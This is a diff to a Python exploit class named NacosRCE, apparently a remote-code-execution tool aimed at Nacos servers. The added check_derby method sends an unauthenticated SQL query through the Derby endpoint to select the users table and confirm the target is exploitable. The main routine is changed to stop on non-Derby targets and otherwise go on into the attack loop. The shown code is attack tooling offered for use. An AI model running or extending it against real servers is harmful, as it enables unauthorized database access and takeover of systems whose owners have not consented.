@@ -27,6 +27,11 @@ class NacosRCE:
             return True
         else:
             return False
+
+    def check_derby(self):
+        req = requests.get(url=self.derby_url + "?sql=select%20*%20from%20users",headers=self.headers)
+        if req.json().get("code") == 500 and "The current storage mode is not Derby" in req.json().get("message"):
+            return False
         
     def get_console_info(self):
         req = requests.get(url=self.console_state_url)
@@ -110,6 +115,9 @@ class NacosRCE:
         self.base_info()
         if self.check_vul() == False:
             print("[-] The interface does not allow unauthorized access or the Access Token is incorrect!")
+            sys.exit(1)
+        if self.check_derby() == False:
+            print("[-] The current storage mode is not Derby and cannot be utilized in the future!")
             sys.exit(1)
         
         while True:
